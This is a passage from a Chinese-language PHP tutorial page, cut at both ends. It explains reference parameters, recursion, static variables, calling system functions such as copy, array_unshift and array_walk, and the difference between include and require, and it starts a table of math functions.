number">100</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'---------'</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上述知识点的在变量章节中，变量引用有讲述，是指变量$a和$b指向到了同一个存储位置，来存值。</p></blockquote><p>&emsp;<br><font color="#FF7F00"><strong>而函数的参数引用，也是这个意思，将形参和实参指向到同一个位置。如果形参在函数体内发生变化，那么实参的值也发生变化。我们来通过实验来看看：</strong></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$foo</span> <span class="token operator">=</span> 100<span class="token punctuation">;</span>//注意：在<span class="token variable">$n</span>前面加上了<span class="token operator">&amp;</span>符<span class="token keyword">function</span> demo<span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$n</span> <span class="token operator">=</span> 10<span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$n</span> + <span class="token variable">$n</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span>  demo<span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span>.<span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>//你会发生<span class="token variable">$foo</span>的值变为了10<span class="token keyword">echo</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过上例，我们发现实参为$foo，在调用demo的时候，<font color="red"><strong>让$foo和$n指向到了同一个存储区域</strong></font>，当$n的值发生变化的时候。那么$foo的值也发生变化。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-7-递归函数"><font color="#3CB371" face="Comic sans MS">1.7 递归函数</font><a href="post/PHP-function#1-7-递归函数"></a></h4><p>递归函数，递归只是一个名字，而递归函数的规定：<font color="red"><strong>函数体内调用函数自己</strong></font>。<br>递归在实际工作中主要是用在：<font color="red"><strong>文件和文件夹操作</strong></font>的时候有使用到。</p><p><font face="Comic sans MS"><font color="#00B2EE"><strong>几个思维上的盲区：</strong></font><br>  1.代码是从上到下执行的，所有代码没有exit等停止符，函数必须执行完。<br>  2.如果函数从函数A跳至函数B后，必须把函数B执行完成再执行函数A余下的代码。<br>  3.递归函数必须要能执行完有结束条件，不然函数就会限入死循环。函数会永远的自我执行下去。<br></font></p><p>我们来写一代码码来理解一下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$num</span> <span class="token operator">=</span> 10<span class="token punctuation">;</span>//调用一次函数A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>A<span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> A<span class="token punctuation">(</span> <span class="token variable">$arg</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>   //在函数A里面去，跑去执行函数B去了   B<span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token string">'我们需要不断的努力，努力到上天都为我们感动'</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$arg</span><span class="token keyword">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> B<span class="token punctuation">(</span> <span class="token variable">$number</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token variable">$number</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token string">'俺是狗蛋，执行完了&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>结论：</strong><br>1.执行函数A到一半的时候，跑去执行了函数B<br>2.执行完函数B，先显示出来的是：“俺是狗蛋，执行完了”，接着显示的才是：“我们需要不断的努力，努力到上天都为我们感动”<br>3.也就是证明了我们所说思维盲区里面的内容，代码从上到下执行，代码必须执行完。</p></blockquote><p>&emsp;<br>  我们来写一个简单的递归代码,让函数自己调用自己。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">dg</span><span class="token punctuation">(</span> <span class="token variable">$n</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token variable">$n</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>   <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$n</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$n</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token comment" spellcheck="true">//在函数体内调用了dg自己哟</span>       <span class="token function">dg</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string">'--------------'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token keyword">echo</span> <span class="token string">'俺是狗蛋，俺还没执行'</span> <span class="token punctuation">.</span> <span class="token variable">$n</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们来仔细推理一次：<br>   1.第一次调用dg()，将数字$n = 2传到dg中，先显示出来了2<br>   2.然后将$n - 1 $n的值为了1<br>   3.接着判断$n 是否大于0,肯定是大于0的，所以调用递归自己，再把自己执行一次。<br>   4.而第二次在执行自己dg()的时候，而最下面的 echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘; 还没有执行到。等待执行完成后再来执行<br>   5.$n此时等于1 ，所以显示出来1。<br>   6.$n把自己减了一次，$n的结果为0<br>   7.$n大于0肯定不成立的，所以显示了一条:”————–”<br>   8.而这个时候该执行：echo ‘俺是狗蛋，俺还没执行’ . $n . ‘<br>‘;<br>   9.第二次执行dg()执行完成。第一次dg()的代码还没执行完，将第4点中的余下代码执行完。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-8-静态变量"><font color="#3CB371" face="Comic sans MS">1.8 静态变量</font><a href="post/PHP-function#1-8-静态变量"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>静态变量的特点是：</strong></font>声明一个静态变量，第二次调用函数的时候，静态变量不会再初始化变量，会在原值的基础上读取执行。<br>实际上:全局变量本身就是静态存储方式,<font color="red"><strong>所有的全局变量都是静态变量</strong></font><br></font></p><p><font color="#FF7F00"><strong>以下讲述局部静态变量和全局静态变量：</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//--------------如何理解static静态变量-----------</span><span class="token comment" spellcheck="true">/** 普通局部变量 */</span><span class="token keyword">function</span> <span class="token function">local</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$loc</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这样，如果直接不给初值0是错误的。</span> <span class="token operator">++</span><span class="token variable">$loc</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$loc</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1</span><span class="token keyword">echo</span> <span class="token string">'===================================&lt;br/>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** static静态局部变量 */</span><span class="token keyword">function</span> <span class="token function">static_local</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">static</span> <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此处可以不赋0值</span> <span class="token variable">$local</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$local</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">static_local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1</span><span class="token function">static_local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//2</span><span class="token function">static_local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//3</span><span class="token comment" spellcheck="true">//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。</span><span class="token keyword">echo</span> <span class="token string">'=======================================&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */</span><span class="token keyword">function</span> <span class="token function">static_global</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">global</span> <span class="token variable">$glo</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，</span> <span class="token comment" spellcheck="true">//但是不能想当然的写上"static"加以修饰，那样是错误的.</span> <span class="token variable">$glo</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$glo</span> <span class="token punctuation">.</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">static_global</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//1</span><span class="token function">static_global</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//2</span><span class="token function">static_global</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//3</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p><h3 id="二-系统函数"><font color="#FF6347" face="Comic sans MS">二. 系统函数</font><a href="post/PHP-function#二-系统函数"></a></h3><h4 id="2-1-使用介绍"><font color="#3CB371" face="Comic sans MS">2.1 使用介绍</font><a href="post/PHP-function#2-1-使用介绍"></a></h4><p><font color="#00B2EE">[<a href="http://www.php.cn" target="_blank" rel="noopener">PHP手册下载</a>]</font></p><ol><li>如果代码能赚钱，帮你赚钱最多的是基本语法</li><li>如果你还在当程序员，你看手册的时间可能比你看老婆的时间还长</li></ol><p><font face="Comic sans MS">使用函数的重点是三块：<br>    1.了解函数的<font color="red">功能</font>，特别是常用函数的功能<br>    2.了解函数的<font color="red">参数</font><br>    3.了解函数的<font color="red">返回值</font><br></font></p><blockquote><p>我们针对上面的三块，讲解6个函数，这6个函数，概况了函数的基本用法的全部注意事项：<br><font color="#00B2EE">**1. 直接返回布尔型，如bool copy ()</font></p><ol start="2"><li>带有MIXED参数的函数如何调用。Mixed表示任何类型的数据。如Array_unshift()</li><li>参数中带有&amp;符的参数，一定要传一个变量做为参数。函数里面改变了他的值。</li><li>带有[]的参数，表示可选项。</li><li>带有…的参数，表示可以传任意多个参数。</li><li>带有callback的参数，表示回调函数。需要传一个函数进来。Array_map()</li><li>函数支持的版本要了解。**</li></ol></blockquote><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. 直接返回布尔型</strong></font><br><font color="red"><strong>bool</strong></font> <strong>copy ( string $source , string $dest [, resource $context ] )</strong><br></font></p><blockquote><p><strong>这个函数的功能为：</strong> 拷备一个文件<br><strong>返回值为为：</strong> bool型值，就是成功返回true，失败返回false<br><strong>参数为：</strong> 两个字符串的值，一个是copy的源文件，一个为目标文件。第三个参数可选的，不常用，我们不管它。</p></blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">'abc.txt'</span><span class="token punctuation">,</span><span class="token string">'bcd.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'复制成功'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'复制失败'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. Mixed表示任何类型的数据。如Array_unshift()</strong></font> </font><br><font color="red"><strong>int</strong></font> array_unshift ( array &amp;$array , <font color="red"><strong>mixed</strong></font>  $value1 [, mixed $… ] )</p><p><font face="Comic sans MS"></font></p><blockquote><p><strong>功能：</strong> 操作一个数组，向数组中之前插入其他类型的参数。<br><strong>返回值：</strong> <font color="#FF7F00"><strong>int 类型</strong></font>，可能就是插入成功最后的个数<br><strong>参数：</strong> <font color="#FF7F00"><br><strong>第一个参数为&amp;符</strong></font>，也就是在操作的过程中，改变了第一个参数的值。引用传参。也就是操作这个数组，向这个数组中传入参数。会直接改变这个数组的值。<font color="#FF7F00"><br><strong>第二个参数为mixed</strong></font>，因为数组可以存入多个不同的类型.mixed是指混合的意思。因此，mixed是指可传入任意类型<font color="#FF7F00"><br><strong>第三个数数加了中括号[ ]</strong></font>，我们所有遇到中括号的。都是指后面的参数可传，也可以不传。<br>第四，最后还看到了三个…(省略号)。代表可以传入任意多个参数。</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$queue</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">"凤姐"</span>, <span class="token string">"芙蓉"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>array_unshift<span class="token punctuation">(</span><span class="token variable">$queue</span>, <span class="token string">"杨幂"</span>, <span class="token string">"姚晨"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span><span class="token variable">$queue</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：Array <span class="token punctuation">(</span> <span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 杨幂 <span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 姚晨 <span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 凤姐 <span class="token punctuation">[</span>3<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> 芙蓉 <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. 遇到callback的传函数或者匿名函数进去协助处理，让功能更强大。</strong></font><br></font><br>bool array_walk ( array &amp;$array , <font color="red"><strong>callable</strong></font> $callback [, mixed $userdata = NULL ] )</p><p><font face="Comic sans MS"></font></p><blockquote><p><font color="#FF7F00"><strong>功能：</strong></font><br>传入一个回调函数，将数组的原来的组操作，并且发生变化。<font color="#FF7F00"><br><strong>返回值：</strong></font><br>bool 值 也就是意味着，提示成功或者失败<font color="#FF7F00"><br><strong>参数：</strong></font><br>第一个参数是要操作的数组。<br>第二个参数是callback 代表着可以传入函数或者匿名函数。</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$shuaige</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">"a"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"wuyanzhu"</span>, <span class="token string">"b"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"huangxiaoming"</span>, <span class="token string">"c"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"ninzetao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> test_print<span class="token punctuation">(</span><span class="token variable">$item2</span>, <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token variable">$key</span> <span class="token keyword">.</span><span class="token string">" ---"</span><span class="token keyword">.</span> strtoupper<span class="token punctuation">(</span><span class="token variable">$item2</span><span class="token punctuation">)</span> <span class="token keyword">.</span> <span class="token string">"&lt;br />\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span><span class="token variable">$shuaige</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>array_walk<span class="token punctuation">(</span><span class="token variable">$shuaige</span>, <span class="token string">'test_print'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'用自定义函数test_print执行后的效果：'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;pre>'</span><span class="token punctuation">;</span>var_dump<span class="token punctuation">(</span><span class="token variable">$shuaige</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;/pre>'</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行结果：array<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>8<span class="token punctuation">)</span> <span class="token string">"wuyanzhu"</span>  <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>13<span class="token punctuation">)</span> <span class="token string">"huangxiaoming"</span>  <span class="token punctuation">[</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>8<span class="token punctuation">)</span> <span class="token string">"ninzetao"</span><span class="token punctuation">}</span>a ---WUYANZHUb ---HUANGXIAOMINGc ---NINZETAO用自定义函数test_print执行后的效果：array<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>8<span class="token punctuation">)</span> <span class="token string">"wuyanzhu"</span>  <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>13<span class="token punctuation">)</span> <span class="token string">"huangxiaoming"</span>  <span class="token punctuation">[</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  string<span class="token punctuation">(</span>8<span class="token punctuation">)</span> <span class="token string">"ninzetao"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过上例，我们发现数组中的每个参数和值都被修改了。上例大家只需要理解看见传callback的，需要传入函数协助处理就可以。不用理解。我们在下一章的数组部份，学习完数组，大家可以再看看。<br>函数支持的版本号很重要。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="2-2-文件包含函数"><font color="#3CB371" face="Comic sans MS">2.2 文件包含函数</font><a href="post/PHP-function#2-2-文件包含函数"></a></h4><p><font face="Comic sans MS">在实际开发中，常常需要把程序中的公用代码放到一个文件中，使用这些代码的文件只需要包含这个文件即可。这种方法有助于提高代码的重用性，给代码的编写与维护带来很大的便利。在PHP中， 有<br><font color="#00B2EE"><strong>include</strong></font><br><font color="#00B2EE"><strong>include_once</strong></font><br><font color="#00B2EE"><strong>require</strong></font><br><font color="#00B2EE"><strong>require_once</strong></font><br>四种方法包含一个文件。<br></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数</th><th align="center">包含失败</th><th align="left">特点</th></tr></thead><tbody><tr><td align="center">Inlcude</td><td align="center">返回一条警告</td><td align="left">文件继续向下执行。通常用于动态包含</td></tr><tr><td align="center">Require</td><td align="center">一个致命的错</td><td align="left">代码就不会继续向下执行。通常包含极为重要的文件，整个代码甭想执行</td></tr><tr><td align="center">Include_once</td><td align="center">返回一条警告</td><td align="left">除了原有include的功能以外，它还会做once检测，如果文件曾经已经被被包含过，不再包含</td></tr><tr><td align="center">Require_once</td><td align="center">一个致命的错</td><td align="left">除了原的功能一外，会做一次once</td></tr></tbody></table></div></div><p>&emsp;</p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**注意：**</font>1，少用_once带once，因为它会消耗更多的资源去做检测的工作。2，特高级Include文件只需要编译一次，因为每次包含include都会再执行一次对应的代码，如何减少include再次执行时，需要重新解析的过程。</font></td></tr></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. include包含函数的功能。</strong></font><br></font><br>创建一个functions.php文件，里面写上两个函数：<font color="#FF6347">(1)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//functions.php文件<span class="token keyword">function</span> demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'aaaa'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'cccdddd'</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>在functions.php的同级目录下，我再创建一个user.php文件把functions.php文件包含进来。这样我的函数就可以专门放在functions.php里面，哪儿需要用到这些函数的时候，我就从哪儿包含进来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//user.phpinclude <span class="token string">'functions.php'</span><span class="token punctuation">;</span>//可以直接调用demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>接下来我们对比include和require：</strong><font color="#FF6347">(2)↓↓</font><br>代码中，我们先用include来<strong>包含不存在</strong>的test.php文件，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//user.phpinclude <span class="token string">'functions.php'</span><span class="token punctuation">;</span>include <span class="token string">'test.php'</span><span class="token punctuation">;</span>//可以直接调用demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再用require包含 不存在的test.php文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//user.phpinclude <span class="token string">'functions.php'</span><span class="token punctuation">;</span>require <span class="token string">'test.php'</span><span class="token punctuation">;</span>//可以直接调用demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><font color="#FF6347"><strong>通过上例的对比我们发现：</strong></font><br>(1) 如果test.php文件不存在include 会发出警告继续执行demo()和test()函数。<br>(2) 而requre则直接报错，demo()和test()函数无法继续执行。</p></blockquote><p>&emsp;<br>我们通过表格知道了:<strong>inlcude</strong> 和<strong>include_once</strong>的区别在于，<font color="#00B2EE"><strong>检测是否重复包含。</strong></font><font color="red"><strong>如果重复包含了include_once不会再包含 对应的文件了，而include 则不管这些。有没引入过文件，都再引入一次。</strong></font>include使用两次会报错，而include_once不会报错！</p><p>同样刚刚的user.php我们再实验一下,我们将functions.php包含两次，分别使用<strong>include</strong>和<strong>include_once</strong>：<font color="#FF6347">(3)↓↓</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//user.php//这儿被包含了两次同样的函数定义文件哟include <span class="token string">'functions.php'</span><span class="token punctuation">;</span>include <span class="token string">'functions.php'</span><span class="token punctuation">;</span>//可以直接调用demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行后系统会报错！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改为<strong>include_once</strong>再试一次：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php//user.php//这儿被包含了两次同样的函数定义文件哟include_once <span class="token string">'functions.php'</span><span class="token punctuation">;</span>include_once <span class="token string">'functions.php'</span><span class="token punctuation">;</span>//可以直接调用demo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>运行后系统不会报错！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>结论：</strong><br>我们在函数定义章节讲过，函数不能定义两次，否则会报错。<font color="#FF7F00"><strong>使用include时</strong></font>，因为我们将 functions.php包含了两次所以执行了两次，<font color="#FF7F00"><strong>因此报这个错误</strong></font>。<br>而<font color="#FF7F00"><strong>include_once不报错</strong></font>的原因是因为：他检测了functions.php曾经包含过，不再进行包含引入了。</p></blockquote><p><font face="Comic sans MS">而<strong>require</strong>和<strong>require_once</strong>的功能，大家用你最最聪明的小脑袋是不是就能推理出来了呢？require_once有两个特点：</font></p><ol><li>包含的文件必须存在，否则停止执行</li><li>会做重复包含检查哟</li></ol><p>&emsp;<br>&emsp;</p><h4 id="2-3-数学常用函数"><font color="#3CB371" face="Comic sans MS">2.3  数学常用函数</font><a href="post/PHP-function#2-3-数学常用函数"></a></h4><p>在PHP程序中常常需要进行数据处理运算，这就需要使用数学函数。<font color="#00B2EE"><strong>数学函数是最简单、最常用的系统函数</strong></font>。本章以数学函数为例讲解系统函数的调用方法。</p><p>只需要记最常用的一些即可，最常用的列表：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">函数名</th><th align="center">描述</th><th align="left">实例</th><th align="left">输入</th><th align="left">输出</th></tr></thead><tbody><tr><td align="center">abs()</td><td align="center">求绝对值</td><td align="left">$abs = abs(-4.2); //4.2</td><td align="left">数字</td><td align="left">绝对值数字</td></tr><tr><td align="center">ceil()</td><td align="center">进一法取整</td><td align="left">echo ceil(9.999); 